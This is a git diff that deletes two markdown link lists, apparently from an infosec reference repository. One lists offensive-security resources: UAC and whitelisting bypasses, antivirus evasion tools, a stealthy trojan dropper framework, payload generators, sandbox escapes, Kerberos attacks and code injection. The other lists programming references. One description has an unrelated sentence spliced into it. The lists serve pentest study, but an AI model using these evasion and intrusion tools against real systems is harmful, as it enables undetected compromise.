-		* Imagine being attacked by legitimate software tools that cannot be detected by usual defender tools. How bad could it be to be attacked by malicious threat actors only sending bytes to be read and bytes to be written in order to achieve advanced attacks? The most dangerous threat is the one you can’t see. At a time when it is not obvious to detect memory attacks using API like VirtualAlloc, what would be worse than having to detect something like “f 0xffffe001`0c79ebe8+0x8 L4 0xe8 0xcb 0x04 0x10”? We will be able to demonstrate that we can achieve every kind of attacks you can imagine using only PowerShell and a Microsoft Signed Debugger. We can retrieve passwords from the userland memory, execute shellcode by dynamically parsing loaded PE or attack the kernel achieving advanced persistence inside any system.
-	* [MemoryModule](https://github.com/fancycode/MemoryModule)
-		* MemoryModule is a library that can be used to load a DLL completely from memory - without storing on the disk first.
-	* [RogueMMC](https://github.com/subTee/RogueMMC)
-		* Execute Shellcode And Other Goodies From MMC
-* **Bypassing UAC**
-	* [Bypassing UAC on Windows 10 using Disk Cleanup](https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/)
-	* [Research on CMSTP.exe](https://msitpros.com/?p=3960)
-		* Methods to bypass UAC and load a DLL over webdav 
-	* [“Fileless” UAC Bypass Using eventvwr.exe and Registry Hijacking](https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/)
-	* [Bypassing UAC using App Paths](https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/)
-	* [“Fileless” UAC Bypass Using eventvwr.exe and Registry Hijacking](https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/)
-	* [Bypass-UAC](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)
-	* [Reading Your Way Around UAC (Part 1)](https://tyranidslair.blogspot.no/2017/05/reading-your-way-around-uac-part-1.html)
-		* [Reading Your Way Around UAC (Part 2)](https://tyranidslair.blogspot.no/2017/05/reading-your-way-around-uac-part-2.html)
-		* [Reading Your Way Around UAC (Part 3)](https://tyranidslair.blogspot.no/2017/05/reading-your-way-around-uac-part-3.html)
-	* [Fileless UAC Bypass using sdclt](https://posts.specterops.io/fileless-uac-bypass-using-sdclt-exe-3e9f9ad4e2b3)
-	* [Eventvwr File-less UAC Bypass CNA](https://www.mdsec.co.uk/2016/12/cna-eventvwr-uac-bypass/)
-* **Anti-Virus**
-	* **Articles**
-		* [How to Bypass Anti-Virus to Run Mimikatz](http://www.blackhillsinfosec.com/?p=5555)
-		* [pecloak.py - An Experiment in AV evasion](http://www.securitysift.com/pecloak-py-an-experiment-in-av-evasion/)
-		* [Practical Anti-virus Evasion - Daniel Sauder](https://govolutionde.files.wordpress.com/2014/05/avevasion_pentestmag.pdf)
-		* [Why Anti-Virus Software Fails](https://deepsec.net/docs/Slides/2014/Why_Antivirus_Fails_-_Daniel_Sauder.pdf)
-		* [avepoc](https://github.com/govolution/avepoc)
-			* some pocs for antivirus evasion
-		* [Sacred Cash Cow Tipping 2017 - BlackHills Infosec](https://www.youtube.com/watch?v=SVwv1dZCtWM)
-			* We're going to bypass most of the major antivirus programs. Why? 1) Because it's fun. 2) Because it'll highlight some of the inherent weaknesses in our environments today.
-		* [Deep Dive Into Stageless Meterpreter Payloads](https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/)
-		* [Execute ShellCode Using Python](http://www.debasish.in/2012/04/execute-shellcode-using-python.html)
-			* In this article I am going to show you, how can we use python and its "ctypes" library to execute a "calc.exe" shell code or any other shell code.
-	* **Bypassing**
-		* [Execute ShellCode Using Python](http://www.debasish.in/2012/04/execute-shellcode-using-python.html)
-			* In this article I am going to show you, how can we use python and its "ctypes" library to execute a "calc.exe" shell code or any other shell code.
-		* [In-Memory Managed Dll Loading With PowerShell - 2012](http://www.exploit-monday.com/2012/12/in-memory-dll-loading.html)
-		* [Generic bypass of next-gen intrusion / threat / breach detection systems](https://blog.mrg-effitas.com/generic-bypass-of-next-gen-intrusion-threat-breach-detection-systems/)
-			* The focus of this blog post is to bypass network monitoring tools, e.g. good-old IDS or next-generation threat detection systems in a generic way. The focus is on the exploit delivery.
-		* [Meterpreter stage AV/IDS evasion with powershell](https://arno0x0x.wordpress.com/2016/04/13/meterpreter-av-ids-evasion-powershell/)
-		* [Customising Meterpreter Loader DLL part. 2](https://astr0baby.wordpress.com/2014/02/13/customising-meterpreter-loader-dll-part-2/)
-		* [Facts and myths about antivirus evasion with Metasploit - mihi - 2011](http://schierlm.users.sourceforge.net/avevasion.html)
-			* This article tries to given an overview about the current executable generation scheme of Metasploit, how AV detects them, and how to evade them. Note that this document only covers standalone EXE files (for Windows) that replace an EXE template's functionality, and not other payloads for exploits, service executables (like for the windows/psexec exploit) or executables that merely add to the original template's functionality (like the -k option of msfpayload).
-	* **Tools**
-		* [AVSignSeek](https://github.com/hegusung/AVSignSeek)
-			* Tool written in python3 to determine where the AV signature is located in a binary/payload
-		* [SpookFlare: Stay In Shadows](https://artofpwn.com/spookflare.html?)
-			* [SpookFlare - Github](https://github.com/hlldz/SpookFlare)
-		* [avet framework](https://github.com/govolution/avet)
-			* AVET is an AntiVirus Evasion Tool, which was developed for making life easier for pentesters and for experimenting with antivirus evasion techniques. In version 1.1 lot of stuff was introduced, for a complete overview have a look at the CHANGELOG file. Now 64bit payloads can also be used, for easier usage I hacked a small build tool (avet_fabric.py).
-		* [Don't Kill My Cat (DKMC)](https://github.com/Mr-Un1k0d3r/DKMC)
-			* Don't kill my cat is a tool that generates obfuscated shellcode that is stored inside of polyglot images. The image is 100% valid and also 100% valid shellcode. The idea is to avoid sandbox analysis since it's a simple "legit" image. For now the tool rely on PowerShell the execute the final shellcode payload.
-			* [Presentation - Northsec2017](https://www.youtube.com/watch?v=7kNwbXgWdX0&list=PLuUtcRxSUZUpv2An-RNhjuZSJ5fjY7ghe&index=9)
-		* [Dr0p1t-Framework](https://github.com/D4Vinci/Dr0p1t-Framework)
-			* Have you ever heard about trojan droppers ? In short dropper is type of trojans that downloads other malwares and Dr0p1t gives you the chance to create a stealthy dropper that bypass most AVs and have a lot of tricks ( Trust me :D ) ;)
- 		* [PowerLine](https://github.com/fullmetalcache/powerline)
-			* [Presentation](https://www.youtube.com/watch?v=HiAtkLa8FOc)
-		* [Invoke-CradleCrafter: Moar PowerShell obFUsk8tion by Daniel Bohannon](https://www.youtube.com/watch?feature=youtu.be&v=Nn9yJjFGXU0&app=desktop)
-		* [Invoke-CradleCrafter v1.1](https://github.com/danielbohannon/Invoke-CradleCrafter)
-		* [wePWNise](https://github.com/mwrlabs/wePWNise)
-			* WePWNise generates architecture independent VBA code to be used in Office documents or templates and automates bypassing application control and exploit mitigation software
-		* [katz.xml](https://gist.github.com/subTee/c98f7d005683e616560bda3286b6a0d8)
-			* Downloads Mimikatz From GitHub, Executes Inside of MsBuild.exe
-		* [SigThief](https://github.com/secretsquirrel/SigThief)
-			* Stealing Signatures and Making One Invalid Signature at a Time
-* **Application Whitelisting**
-	* [Modern Evasion Techniques Jason Lang - Derbycon7](https://www.youtube.com/watch?v=xcA2riLyHtQ&index=6&list=PLNhlcxQZJSm-PKUZTYe1C94ymf0omysM3)
-	* [Whitelisting Evasion - subTee - Shmoocon 2015](https://www.youtube.com/watch?v=85M1Rw6mh4U)
-	* [BinariesThatDoesOtherStuff.txt - api0cradle](https://gist.github.com/api0cradle/8cdc53e2a80de079709d28a2d96458c2)
-	* [GreatSCT](https://github.com/GreatSCT/GreatSCT)
-		* The project is called Great SCT (Great Scott). Great SCT is an open source project to generate application white list bypasses. This tool is intended for BOTH red and blue team.
-	* [Backdoor-Minimalist.sct](https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302)
-		* Applocker bypass
-	* [Whitelist Evasion revisited](https://khr0x40sh.wordpress.com/2015/05/27/whitelist-evasion-revisited/)
-	* [Bypassing Application Whitelisting by using WinDbg/CDB as a Shellcode Runner](http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html)
-	* [Application Whitelist Bypass Techniques](https://github.com/subTee/ApplicationWhitelistBypassTechniques)
-		* A Catalog of Application Whitelisting Bypass Techniques - SubTee
-	* [Whitelist Bypass techniques](https://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt)
-	* [Shackles, Shims, and Shivs - Understanding Bypass Techniques](http://www.irongeek.com/i.php?page=videos/derbycon6/535-shackles-shims-and-shivs-understanding-bypass-techniques-mirovengi)
-	* [Applocker Bypass via Registry Key Manipulation](https://www.contextis.com/resources/blog/applocker-bypass-registry-key-manipulation/)
-	* [Shackles, Shims, and Shivs - Understanding Bypass Techniques](http://www.irongeek.com/i.php?page=videos/derbycon6/535-shackles-shims-and-shivs-understanding-bypass-techniques-mirovengi)
-	* [RunMe.c](https://gist.github.com/hugsy/e5c4ce99cd7821744f95)
-		* Trick to run arbitrary command when code execution policy is enforced (i.e. AppLocker or equivalent). Works on Win98 (lol) and up - tested on 7/8
-	* [$@|sh – Or: Getting a shell environment from Runtime.exec](https://codewhitesec.blogspot.ro/2015/03/sh-or-getting-shell-environment-from.html)
-	* [Bypass Application Whitelisting Script Protections - Regsvr32.exe & COM Scriptlets (.sct files)](http://subt0x10.blogspot.sg/2017/04/bypass-application-whitelisting-script.html)
-	* [Bypassing Application Whitelisting using MSBuild.exe - Device Guard Example and Mitigations](http://subt0x10.blogspot.sg/2017/04/bypassing-application-whitelisting.html)
-	* [Window Signed Binary](https://github.com/vysec/Windows-SignedBinary)
-	* [MS Signed mimikatz in just 3 steps](https://github.com/secretsquirrel/SigThief)
-* **DeviceGuard Bypass**
-	* [Window 10 Device Guard Bypass](https://github.com/tyranid/DeviceGuardBypasses)
-	* [Defeating Device Guard: A look into CVE-2017-0007](https://enigma0x3.net/2017/04/03/defeating-device-guard-a-look-into-cve-2017-0007/)
-* **Sandbox Bypass/Escape**
-	* [Sandboxes from a pen tester’s view - Rahul Kashyap](http://www.irongeek.com/i.php?page=videos/derbycon3/4303-sandboxes-from-a-pen-tester-s-view-rahul-kashyap)
-		* Description: In this talk we’ll do an architectural decomposition of application sandboxing technology from a security perspective. We look at various popular sandboxes such as Google Chrome, Adobe ReaderX, Sandboxie amongst others and discuss the limitations of each technology and it’s implementation. Further, we discuss in depth with live exploits how to break out of each category of sandbox by leveraging various kernel and user mode exploits – something that future malware could leverage. Some of these exploit vectors have not been discussed widely and awareness is important.
-	* **chroot**
-		* [chw00t: chroot escape tool](https://github.com/earthquake/chw00t)
-		* [Breaking Out of a Chroot Jail Using PERL](http://pentestmonkey.net/blog/chroot-breakout-perl)
-	* **ssh**
-		* [ssh environment - circumvention of restricted shells](http://www.opennet.ru/base/netsoft/1025195882_355.txt.html)
-	* **Adobe Sandbox**
-		* [Adobe Sandbox: When the Broker is Broken - Peter Vreugdenhill](https://cansecwest.com/slides/2013/Adobe%20Sandbox.pdf)
-	* **Python Sandbox**
-		* [Escaping a Python sandbox with a memory corruption bug](https://hackernoon.com/python-sandbox-escape-via-a-memory-corruption-bug-19dde4d5fea5)
-		* [Breaking out of secured Python environments](http://tomforb.es/breaking-out-of-secured-python-environments)
-		* [Sandboxed Execution Environment ](http://pythonhosted.org/python-see)
-		* [Documentation](http://pythonhosted.org/python-see)
-			* Sandboxed Execution Environment (SEE) is a framework for building test automation in secured Environments.  The Sandboxes, provided via libvirt, are customizable allowing high degree of flexibility. Different type of Hypervisors (Qemu, VirtualBox, LXC) can be employed to run the Test Environments.
-		* [Usermode Sandboxing](http://www.malwaretech.com/2014/10/usermode-sandboxing.html)
-	* **Citrix/Terminal Services**
-		* [Breaking Out! of Applications Deployed via Terminal Services, Citrix, and Kiosks](https://blog.netspi.com/breaking-out-of-applications-deployed-via-terminal-services-citrix-and-kiosks/)
-		* [Breaking Out of Citrix and other Restricted Desktop Environments](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/)
-* **Virtualbox**
-	* [VirtualBox Detection Via WQL Queries](http://waleedassar.blogspot.com/)
-	* [Bypassing VirtualBox Process Hardening on Windows](https://googleprojectzero.blogspot.com/2017/08/bypassing-virtualbox-process-hardening.html)
-	* [VBoxHardenedLoader](https://github.com/hfiref0x/VBoxHardenedLoader)
-		* VirtualBox VM detection mitigation loader
-
----------------------------
-### <a name="payloads"></a>Payloads/Stuff/Idk
-**Payloads**
-* **HTA** 
-	* [genHTA](https://github.com/vysec/GenHTA)
-		* Generates anti-sandbox analysis HTA files without payloads
-	* [morpHTA](https://github.com/vysec/MorphHTA)
-		* Morphing Cobalt Strike's evil.HTA 
-* **LNK Files**
-	* [LNKUp](https://github.com/Plazmaz/LNKUp)
-		* Generates malicious LNK file payloads for data exfiltration
-	* [Embedding reverse shell in .lnk file or Old horse attacks](http://onready.me/old_horse_attacks.html)
-* [WsgiDAV](https://github.com/mar10/wsgidav)
-	* WsgiDAV is a generic WebDAV server written in Python and based on WSGI.
-* [Pupy](https://github.com/n1nj4sec/pupy)
-	* Pupy is a remote administration tool with an embeded Python interpreter, allowing its modules to load python packages from memory and transparently access remote python objects. The payload is a reflective DLL and leaves no trace on disk
-* [VBad](https://github.com/Pepitoh/VBad)
-	* VBad is fully customizable VBA Obfuscation Tool combined with an MS Office document generator. It aims to help Red & Blue team for attack or defense.
-* [Winpayloads](https://github.com/nccgroup/Winpayloads)
-		* Undetectable Windows Payload Generation with extras Running on Python2.7
-* [Payload Generation with CACTUSTORCH](https://www.mdsec.co.uk/2017/07/payload-generation-with-cactustorch/)
-* [SCT-obfuscator](https://github.com/Mr-Un1k0d3r/SCT-obfuscator)
-	* SCT payload obfuscator. Rename variables and change harcoded char value to random one.
-* [Winpayloads](https://github.com/nccgroup/Winpayloads)
-	* Undetectable Windows Payload Generation with extras Running on Python2.7
-
-
-
-----------------------
-### <a name="kerberos">Kerberos Related</a>
-**Keberos**
-* **General**
-	* [Attacking Microsoft Kerberos: Kicking the Guard Dog of Hades](https://www.irongeek.com/i.php?page=videos/derbycon4/t120-attacking-microsoft-kerberos-kicking-the-guard-dog-of-hades-tim-medin)
-		* Kerberos- besides having three heads and guarding the gates of hell- protects services on Microsoft Windows Domains. Its use is increasing due to the growing number of attacks targeting NTLM authentication. Attacking Kerberos to access Windows resources represents the next generation of attacks on Windows authentication.In this talk Tim will discuss his research on new attacks against Kerberos- including a way to attack the credentials of a remote service without sending traffic to the service as well as rewriting tickets to access systems.He will also examine potential countermeasures against Kerberos attacks with suggestions for mitigating the most common weaknesses in Windows Kerberos deployments.
-	* [Et tu - Kerberos?](https://www.irongeek.com/i.php?page=videos/derbycon4/t109-et-tu-kerberos-christopher-campbell)
-		* For over a decade we have been told that Kerberos is the answer to Microsoft’s authentication woes and now we know that isn’t the case. The problems with LM and NTLM are widely known- but the problems with Kerberos have only recently surfaced. In this talk we will look back at previous failures in order to look forward. We will take a look at what recent problems in Kerberos mean to your enterprise and ways you could possibly mitigate them. Attacks such as Spoofed-PAC- Pass-the-Hash- Golden Ticket- Pass-the-Ticket and Over-Pass-the-Ticket will be explained. Unfortunately- we don’t really know what is next – only that what we have now is broken.
-	* [Abusing Kerberos](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don%27t-Get-It-wp.pdf)
-* **Tools**
-	* [PyKEK](https://github.com/bidord/pykek)
-		* PyKEK (Python Kerberos Exploitation Kit), a python library to manipulate KRB5-related data. (Still in development)`
-
-
-
-### <a name="docker"></a>Docker & Containers
-**Docker & Containers**
-* [Vulnerable Docker VM](https://www.notsosecure.com/vulnerable-docker-vm/)
-	* For practicing pen testing docker instances
-* [Is it possible to escalate privileges and escaping from a Docker container? - StackOverflow](https://security.stackexchange.com/questions/152978/is-it-possible-to-escalate-privileges-and-escaping-from-a-docker-container)
-* [The Dangers of Docker.sock](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/)
-* [Abusing Privileged and Unprivileged Linux Containers - nccgroup](https://www.nccgroup.trust/uk/our-research/abusing-privileged-and-unprivileged-linux-containers/)
-* [Understanding and Hardening Linux Containers - nccgroup](https://www.nccgroup.trust/uk/our-research/understanding-and-hardening-linux-containers/)
-	* Operating System virtualisation is an attractive feature foThis project provides a command line tool called nms that recreates the famous data decryption effect seen on screen in the 1992 hacker movie Sneakers. For reference, you can see this effect at 0:35 in this movie clip.r efficiency, speed and modern application deployment, amid questionable security. Recent advancements of the Linux kernel have coalesced for simple yet powerful OS virtualisation via Linux Containers, as implemented by LXC, Docker, and CoreOS Rkt among others. Recent container focused start-ups such as Docker have helped push containers into the limelight. Linux containers offer native OS virtualisation, segmented by kernel namespaces, limited through process cgroups and restricted through reduced root capabilities, Mandatory Access Control and user namespaces. This paper discusses these container features, as well as exploring various security mechanisms. Also included is an examination of attack surfaces, threats, and related hardening features in order to properly evaluate container security. Finally, this paper contrasts different container defaults and enumerates strong security recommendations to counter deployment weaknesses-- helping support and explain methods for building high-security Linux containers. Are Linux containers the future or merely a fad or fantasy? This paper attempts to answer that question.
-* [Docker: Security Myths, Security Legends - Rory McCune](https://www.youtube.com/watch?v=uQigvjSXMLw)
-
-
-
-
-
-
----------------------------------
-### <a name="inject"></a>Code Injection
-**Code Injection**
-* [injectAllTheThings](https://github.com/fdiskyou/injectAllTheThings/)
-	* Single Visual Studio project implementing multiple DLL injection techniques (actually 7 different techniques) that work both for 32 and 64 bits. Each technique has its own source code file to make it easy way to read and understand.
-* [Inject All the Things - Shut up and hack](http://blog.deniable.org/blog/2017/07/16/inject-all-the-things/)
-	* Accompanying above project
-* [PowerLoaderEX](https://github.com/BreakingMalware/PowerLoaderEx)
-* [Injection on Steroids: Code-less Code Injections and 0-Day Techniques](https://breakingmalware.com/injection-techniques/code-less-code-injections-and-0-day-techniques/)
-* [Injection on Steroids: Code less Code Injections and 0 Day Techniques - Paul Schofield Udi Yavo](https://www.youtube.com/watch?v=0BAaAM2wD4s)
-* [InfectPE](https://github.com/secrary/InfectPE)
-	* Using this tool you can inject x-code/shellcode into PE file. InjectPE works only with 32-bit executable files.
-* [InjectProc - Process Injection Techniques](https://github.com/secrary/InjectProc)
-* [PowerLoaderEX](https://github.com/BreakingMalware/PowerLoaderEx)
-	* Advanced Code Injection Technique for x32 / x64
-* [pyrasite](https://github.com/lmacken/pyrasite)
-	* Tools for injecting arbitrary code into running Python processes.
-
----------------------------------------
-### <a name="papers"></a>Papers
-**Papers**
-* [Adapting Software Fault Isolation to Contemporary CPU Architectures](https://static.googleusercontent.com/media/research.google.com/en/us/pubs/archive/35649.pdf)
-	* Adapting Software Fault Isolation to Contemporary CPU ArchitecturesSoftware Fault Isolation (SFI) is an effective approach to sandboxing binary code of questionable provenance, an interesting use case for native plugins in a Web browser. We present software fault isolation schemes for ARM and x86-64 that provide control-flow and memory integrity with average performance overhead of under 5% on ARM and 7% on x86-64. We believe these are the best known SFI implementations for these architectures, with significantly lower overhead than previous systems for similar architectures. Our experience suggests that these SFI implementations benefit from instruction-level parallelism, and have particularly small impact for work- loads that are data memory-bound, both properties that tend to reduce the impact of our SFI systems for future CPU implementations.](https://static.googleusercontent.com/media/research.google.com/en/us/pubs/archive/35649.pdf)
-* [NaCl SFI model on x86-64 systems](https://developer.chrome.com/native-client/reference/sandbox_internals/x86-64-sandbox#x86-64-sandbox)
-	* This document addresses the details of the Software Fault Isolation (SFI) model for executable code that can be run in Native Client on an x86-64 system
-* [Exploiting the DRAM rowhammer bug to gain kernel privileges](https://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html)
-
-
diff --git a/Draft/Programming - Languages Libs Courses References.md b/Draft/Programming - Languages Libs Courses References.md
deleted file mode 100755
index 21b07d0..0000000
--- a/Draft/Programming - Languages Libs Courses References.md	
+++ /dev/null
@@ -1,500 +0,0 @@
-f###Programming Language Courses and References
-
-
-
-TOC
-
-Cull
-* [General](#general)
-* [Source Code Analysis](#sca)
-* [ASM](#asm)
-* [Android](#android)
-* [Bash](#bash)
-* [C/C++](#c)
-* [Go](#go)
-* [Java](#java)
-* [.Net](#net)
-* [Perl](#perl)
-* [Powershell](#power)
-* [Python](#python)
-* [Ruby](#ruby)
-* [Papers](#papers)
-
-### Cull
-http://www.irongeek.com/i.php?page=videos/derbycon4/t205-code-insecurity-or-code-in-security-mano-dash4rk-paul
-http://en.cppreference.com/w/c	
-
-* [Hide data inside pointers](http://arjunsreedharan.org/post/105266490272/hide-data-inside-pointers)
-* [Alamofire](https://github.com/Alamofire/Alamofire)
-	* Alamofire is an HTTP networking library written in Swift.
-
-* [plog](https://github.com/SergiusTheBest/plog)
-* Portable, simple and extensible C++ logging library
-* [Dynamic Source Code Generation and Compilation](https://docs.microsoft.comen-us/dotnet/framework/reflection-and-codedom/dynamic-source-code-generation-and-compilation)
-#### End Cull
-
-
-
-
-
------------
-### <a name="general">General</a>
-The content here is just stuff I've come across or think would be useful to someone in infosec. It is not to be taken as anything beyond a suggestion about stuff.
-* [Secure Coding Standards - Android](https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=111509535)
-* [Secure Coding Cheat Sheet - OWASP](https://www.owasp.org/index.php/Secure_Coding_Cheat_Sheet)
-* [What a C programmer should know about memory](http://marek.vavrusa.com/c/memory/2015/02/20/memory/)
-* [How to be a Programmer: Community Version](https://github.com/braydie/HowToBeAProgrammer)
-	* To be a good programmer is difficult and noble. The hardest part of making real a collective vision of a software project is dealing with one's coworkers and customers. Writing computer programs is important and takes great intelligence and skill. But it is really child's play compared to everything else that a good programmer must do to make a software system that succeeds for both the customer and myriad colleagues for whom he or she is partially responsible. In this essay I attempt to summarize as concisely as possible those things that I wish someone had explained to me when I was twenty-one.
-* [Loop Patterns](https://users.cs.duke.edu/~ola/patterns/plopd/loops.html#loop-and-a-half)
-* [Learn_X_in_Y_Minutes](http://learnxinyminutes.com/)
-* [Hyperpolyglot](http://hyperpolyglot.org/)
-* [App Ideas - Stuff to build out ot improve your programming skills](https://github.com/tastejs/awesome-app-ideas)
-* [Secure iOS application development](https://github.com/felixgr/secure-ios-app-dev)
-	* This guide is a collection of the most common vulnerabilities found in iOS applications. The focus is on vulnerabilities in the applications’ code and only marginally covers general iOS system security, Darwin security, C/ObjC/C++ memory safety, or high-level application security. Nevertheless, hopefully the guide can serve as training material to iOS app developers that want to make sure that they ship a more secure app. Also, iOS security reviewers can use it as a reference during assessments.
-* [Mostly Adequate Guide](https://drboolean.gitbooks.io/mostly-adequate-guide/)
-	* This is a book on the functional paradigm in general. We'll use the world's most popular functional programming language: JavaScript. Some may feel this is a poor choice as it's against the grain of the current culture which, at the moment, feels predominately imperative. 
-* [Six Stages of debugging](http://plasmasturm.org/log/6debug/)
-	```
-		* 1. That can’t happen.
-		* 2. That doesn’t happen on my machine.
-		* 3. That shouldn’t happen.
-		* 4. Why does that happen?
-		* 5. Oh, I see.
-		* 6. How did that ever work?
-	```
-
-
-### Talks/Videos
-Talks/Videos
-* [Big picture software testing unit testing, Lean Startup, and everything in between PyCon 2017](https://www.youtube.com/watch?v=Vaq_e7qUA-4&feature=youtu.be&t=63s)
-* [Boundaries - By Gary Bernhardt from SCNA 2012](https://www.destroyallsoftware.com/talks/boundaries)
-	* This talk is about using simple values (as opposed to complex objects) not just for holding data, but also as the boundaries between components and subsystems. It moves through many topics: functional programming; mutability's relationship to OO; isolated unit testing with and without test doubles; and concurrency, to name some bar. The "Functional Core, Imperative Shell" screencast mentioned at the end is available as part of season 4 of the DAS catalog. 
-* [Big picture software testing unit testing, Lean Startup, and everything in between PyCon 2017](https://www.youtube.com/watch?v=Vaq_e7qUA-4&feature=youtu.be&t=63s)
-	* There are many ways you can test your software: unit testing, manual testing, end-to-end testing, and so forth. Take a step back and you'll discover even more form of testing, many of them very different in their goals: A/B testing, say, where you see which of two versions of your website results in more signups or ad clicks. How do these forms of testing differ, how do they relate to each other? How do you choose which kind of testing to pursue, given limited time and resources? How do you deal with strongly held yet opposite views arguing either that a particular kind of testing is essential or that it's a waste time? This talk will provide you with a model, a way to organize all forms of testing and understand what exactly they provide, and why. Once you understand the model you will be able to choose the right form of testing for *your* situation and goals.
-* [RailsConf 2015 - Nothing is Something](https://www.youtube.com/watch?v=OMPfEXIlTVE)
-
-
-
-### Articles
-* [Counterfeit Object-oriented Programming](http://syssec.rub.de/media/emma/veroeffentlichungen/2015/03/28/COOP-Oakland15.pdf)
-* [Getting Started with WinDbg part 1](http://blog.opensecurityresearch.com/2013/12/getting-started-with-windbg-part-1.html)
-* [An Introduction to Debugging the Windows Kernel with WinDbg](http://www.contextis.com/resources/blog/introduction-debugging-windows-kernel-windbg/)
-* [Hide data inside pointers](http://arjunsreedharan.org/post/105266490272/hide-data-inside-pointers)
-* [Record and Replay Debugging with Firefox](https://developer.mozilla.org/en-US/docs/Mozilla/Debugging/Record_and_Replay_Debugging_Firefox)
-* [rr](https://github.com/mozilla/rr)
-	* rr is a lightweight tool for recording and replaying execution of applications (trees of processes and threads). More information about the project, including instructions on how to install, run, and build rr, is at http://rr-project.org.w
-
-
-
------------
-### <a name="sca">Source Code Analysis</a>
-Source Code Analysis
-* Tools
-	* [RIPS](http://rips-scanner.sourceforge.net/)
-		* RIPS is a tool written in PHP to find vulnerabilities in PHP applications using static code analysis. By tokenizing and parsing all source code files RIPS is able to transform PHP source code into a program model and to detect sensitive sinks (potentially vulnerable functions) that can be tainted by user input (influenced by a malicious user) during the program flow. Besides the structured output of found vulnerabilities RIPS also offers an integrated code audit framework for further manual analysis.
-	* [PHPMD - PHP Mess Detector](http://phpmd.org/about.html)  * What PHPMD does is: It takes a given PHP source code base and look for several potential problems within that source. These problems can be things like: Possible bugs; Suboptimal code; Overcomplicated expressions; Unused parameters, methods, properties.
-	* [PMD](http://pmd.sourceforge.net/)
-		* PMD is a source code analyzer. It finds common programming flaws like unused variables, empty catch blocks, unnecessary object creation, and so forth. It supports Java, JavaScript, PLSQL, Apache Velocity, XML, XSL. Additionally it includes CPD, the copy-paste-detector. CPD finds duplicated code in Java, C, C++, C#, PHP, Ruby, Fortran, JavaScript, PLSQL, Apache Velocity, Ruby, Scala, Objective C, Matlab, Python, Go. 
-	* [Graudit](http://www.justanotherhacker.com/projects/graudit.html)
-		* Graudit is a simple script and signature sets that allows you to find potential security flaws in source code using the GNU utility grep. It's comparable to other static analysis applications like RATS, SWAAT and flaw-finder while keeping the technical requirements to a minimum and being very flexible.
-	* [PumaScan](https://github.com/pumasecurity/puma-scan)
-		* provides real time, continuous source code analysis
-	* [How to find 56 potential vulnerabilities in FreeBSD code in one evening](https://www.viva64.com/en/b/0496/)
-	* [Phan](https://github.com/phan/phan)
-		* Phan is a static analyzer for PHP. Phan prefers to avoid false-positives and attempts to prove incorrectness rather than correctness.
-
-
-
----------
-### <a name="asm">Assembly x86/x64/ARM</a>
-x86/x64/ARM Assembly
-	* [x86 Assembly - Wikipedia](https://en.wikipedia.org/wiki/X86)
-	* [x86-64 Assembly - Wikipedia](https://en.wikipedia.org/wiki/X86-64)
-	* [Mov is turing complete](http://www.cl.cam.ac.uk/~sd601/papers/mov.pdf)
-* Learning
-	* [x86 Assembly Guide/Reference - Wikibooks](https://en.wikibooks.org/wiki/X86_Assembly)
-		* Introduction for those who don’t know ASM and a reference for those that do.
-	* [Guide to x86 Assembly](http://www.cs.virginia.edu/~evans/cs216/guides/x86.html)
-	* [Intro to x86 calling conventions](http://codearcana.com/posts/2013/05/21/a-brief-introduction-to-x86-calling-conventions.html)
-	* [Reading ASM](http://cseweb.ucsd.edu/classes/sp11/cse141/pdf/02/S01_x86_64.key.pdf)
-	* [Machine-Level Representation of Programs](https://2013.picoctf.com//docs/asmhandout.pdf)
-	* [Intro to x86 - OpensSecurityTraining.info](http://opensecuritytraining.info/IntroX86.html)
-	* [cgasm](https://github.com/bnagy/cgasm)
-		* cgasm is a standalone, offline terminal-based tool with no dependencies that gives me x86 assembly documentation. It is pronounced "SeekAzzem".
-	* [x86 Assembly Crash Course](https://www.youtube.com/watch?v=75gBFiFtAb8)
-	* [Learning assembly for linux-x64](https://github.com/0xAX/asm)
-	* [Introduction to writing x86 assembly code in Visual Studio](http://lallouslab.net/2014/07/03/introduction-to-writing-x86-assembly-code-in-visual-studio/)
-	* [Introduction to writing x64 assembly in Visual Studio](http://lallouslab.net/2016/01/11/introduction-to-writing-x64-assembly-in-visual-studio/)
-	* [x86 Call/Return Protocol](http://pages.cs.wisc.edu/~remzi/Classes/354/Fall2012/Handouts/Handout-CallReturn.pdf)
-* Reference
-	* [Nasm x86 reference](https://www.cs.uaf.edu/2006/fall/cs301/support/x86/)
-	* [x86 Assembly Guide/Reference - Wikibooks](https://en.wikibooks.org/wiki/X86_Assembly)
-		* Introduction for those who don’t know ASM and a reference for those that do.
-	* [x86 Disassembly/Calling Conventions](https://en.wikibooks.org/wiki/X86_Disassembly/Calling_Conventions)
-	* [x86 Disassembly/Calling Convention Examples](https://en.wikibooks.org/wiki/X86_Disassembly/Calling_Convention_Examples)
-	* [sandpile.org](http://www.sandpile.org/) 
-		* The world's leading source for technical x86 processor information.
-		* Good source of reference docs/images for x86 ASM
-	* [Walkthrough: Creating and Using a Dynamic Link Library (C++)](https://msdn.microsoft.com/en-us/library/ms235636.aspx)
-	* [Intel x86 Assembler Instruction Set Opcode Table](http://sparksandflames.com/files/x86InstructionChart.html)
-* Videos
-	* [Introduction Video Series(6) to x86 Assembly](https://www.youtube.com/watch?v=qn1_dRjM6F0&list=PLPXsMt57rLthf58PFYE9gOAsuyvs7T5W9)
-	* [Intro to x86 - Derbycon5](http://www.irongeek.com/i.php?page=videos/derbycon5/stable34-intro-to-x86-stephanie-preston)
-* Tools
-	* [WinREPL](https://github.com/zerosum0x0/WinREPL)
-		* x86 and x64 assembly "read-eval-print loop" shell for Windows
